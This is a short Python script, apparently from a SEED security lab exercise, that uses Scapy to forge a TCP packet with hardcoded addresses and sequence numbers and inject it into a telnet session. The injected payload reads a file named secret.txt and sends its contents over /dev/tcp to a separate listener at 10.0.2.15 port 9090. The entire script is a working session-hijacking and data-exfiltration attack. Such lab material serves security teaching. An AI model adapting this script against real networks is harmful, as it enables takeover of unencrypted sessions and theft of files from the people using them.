#!/usr/bin/python
import sys
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET...")
IPLayer = IP(src="10.0.2.5",dst="10.0.2.4")
TCPLayer = TCP(sport=56986,dport=23, flags="A", seq=3995044373, ack=3932038742)

Data = "\r cat /home/seed/secret.txt > /dev/tcp/10.0.2.15/9090\r"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt, verbose= 0)
